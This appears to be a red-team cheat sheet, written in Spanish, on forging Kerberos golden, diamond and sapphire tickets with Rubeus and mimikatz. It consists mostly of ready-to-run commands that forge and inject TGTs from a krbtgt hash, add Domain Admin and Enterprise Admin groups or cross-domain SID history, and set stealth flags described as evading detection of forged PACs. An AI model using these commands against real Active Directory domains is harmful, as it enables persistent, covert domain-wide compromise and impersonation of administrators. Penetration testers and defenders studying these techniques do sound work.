---
aliases:
  - Golden Ticket Windows
  - Rubeus golden
  - mimikatz golden
tags:
  - type/technique
  - technique/persistence
  - technique/kerberos
  - env/windows
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Golden Ticket]]'
---

# Golden Ticket - Forging Windows

***

## Rubeus golden — RC4

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe golden /rc4:HASH /user:administrator /id:500 /domain:corp.local /sid:SID /ptt` | Forge + inject TGT RC4 | Standard Windows. |
| `Rubeus.exe golden /rc4:HASH /user:administrator /id:500 /domain:corp.local /sid:SID /outfile:golden.kirbi` | Forge sin inject → archivo | Para transferir. |
^gt-forge-rubeus-rc4

```powershell
.\Rubeus.exe golden `
  /rc4:KRBTGTNTHASH `
  /user:administrator `
  /id:500 `
  /domain:corp.local `
  /sid:S-1-5-21-1234567890-987654321-111222333 `
  /ptt

klist
dir \\dc01.corp.local\c$
```

___

## Rubeus golden — AES256 (OPSEC)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe golden /aes256:HASH /user:administrator /id:500 /domain:corp.local /sid:SID /ptt` | Forge AES256 — sin RC4 downgrade | Stealth en dominios AES-only. |
| `/opsec` flag | Ajusta flags del ticket para parecer legítimo | Extra OPSEC. |
^gt-forge-rubeus-aes

```powershell
.\Rubeus.exe golden `
  /aes256:AES256HASH `
  /user:administrator `
  /id:500 `
  /domain:corp.local `
  /sid:S-1-5-21-... `
  /ptt `
  /opsec
```

___

## Rubeus golden — flags avanzados

| **Flag** | **Valor** | **Efecto** |
|:---:|:---:|:---:|
| `/groups:<RIDs>` | `512,513,518,519,520` | DA, DU, Schema, EA, Policy groups en PAC. |
| `/sids:<SID>` | `PARENT_SID-519` | SID History — cross-domain EA. |
| `/endin:<min>` | `600` (10h) | TGT end time en minutos. |
| `/renewmax:<min>` | `10080` (7d) | Max renewal time. |
| `/startoffset:<min>` | `-5` | Backdate 5 min (clock skew buffer). |
| `/dc:<fqdn>` | `dc01.corp.local` | DC específico para validar. |
| `/printcmd` | flag | Print mimikatz equivalent command. |
^gt-forge-rubeus-flags

```powershell
# Golden con lifetime realista + grupos correctos
.\Rubeus.exe golden `
  /aes256:AES256HASH `
  /user:administrator /id:500 `
  /domain:corp.local `
  /sid:S-1-5-21-... `
  /groups:512,513,518,519,520 `
  /endin:600 /renewmax:10080 `
  /startoffset:-5 `
  /ptt /opsec
```

___

## mimikatz kerberos::golden

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerberos::golden /user:admin /domain:corp.local /sid:SID /krbtgt:HASH /ptt` | Forge + inject básico | Standard mimikatz. |
| `kerberos::golden /user:admin /domain:corp.local /sid:SID /krbtgt:HASH /id:500 /groups:512,513,520,518,519 /ptt` | Con groups correctos | Completo. |
| `kerberos::golden /user:admin /domain:corp.local /sid:SID /aes256:HASH /ptt` | AES256 | Stealth. |
^gt-forge-mimi

```
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:NTHASH /id:500 /groups:512,513,520,518,519 /ptt
mimikatz # misc::cmd

:: En cmd abierto con golden ticket
dir \\dc01.corp.local\c$
```

___

## Diamond Ticket (PAC legítimo)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:512 /krbkey:KRBTGT_AES /ptt` | Forge con PAC copiado de ticket legítimo | Evade PAC validation detection. |
^gt-forge-diamond

```powershell
# Diamond ticket — PAC real, más difícil de detectar
.\Rubeus.exe diamond `
  /tgtdeleg `
  /ticketuser:administrator `
  /ticketuserid:500 `
  /groups:512 `
  /krbkey:KRBTGT_AES256HASH `
  /ptt
```

**Key:** Diamond usa S4U2Self para obtener PAC real del KDC, luego lo modifica mínimamente. Evita detecciones que buscan PACs forjados.

___

## Sapphire Ticket

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe sapphire /user:admin /aes256:AES /dc:DC /ptt` | Copia PAC via S4U2Self+S4UProxy — no forja PAC | Máximo stealth. |
^gt-forge-sapphire

```powershell
.\Rubeus.exe sapphire /user:administrator /aes256:KRBTGT_AES /dc:dc01.corp.local /ptt
```

**Key:** Sapphire obtiene TGS real con PAC real del target user. No genera PAC forjado — ticket es 100% legítimo en contenido.

***
